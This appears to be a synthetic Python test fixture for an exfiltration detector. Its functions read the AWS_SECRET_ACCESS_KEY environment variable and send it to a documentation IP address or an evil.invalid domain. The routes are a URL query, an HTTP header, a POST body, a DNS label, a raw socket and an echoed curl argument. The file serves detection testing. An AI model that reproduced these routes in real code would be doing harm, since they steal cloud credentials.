"""Synthetic toy: five canary exfil shapes (URL, header, body, DNS label, argv) plus socket.send."""
import base64
import os
import socket
import subprocess
import urllib.request


def _token() -> str:
    return os.environ.get("AWS_SECRET_ACCESS_KEY", "")


def via_url() -> None:
    try:
        urllib.request.urlopen("http://198.51.100.30/c?d=" + _token(), timeout=2)
    except OSError:
        pass


def via_header() -> None:
    req = urllib.request.Request("http://198.51.100.30/h", headers={"X-Canary": _token()})
    try:
        urllib.request.urlopen(req, timeout=2)
    except OSError:
        pass


def via_body() -> None:
    req = urllib.request.Request("http://198.51.100.30/b", data=_token().encode(), method="POST")
    try:
        urllib.request.urlopen(req, timeout=2)
    except OSError:
        pass


def via_dns() -> None:
    label = base64.b32encode(_token().encode()).decode("ascii").rstrip("=").lower()
    try:
        socket.getaddrinfo(f"{label}.evil.invalid", 80)
    except OSError:
        pass


def via_send() -> None:
    sock = socket.socket()
    sock.settimeout(1)
    try:
        sock.connect(("198.51.100.30", 9))
    except OSError:
        pass
    try:
        sock.send(_token().encode())
    except OSError:
        pass


def via_argv() -> None:
    subprocess.run(["/bin/echo", "curl", "-d", _token()], check=False)
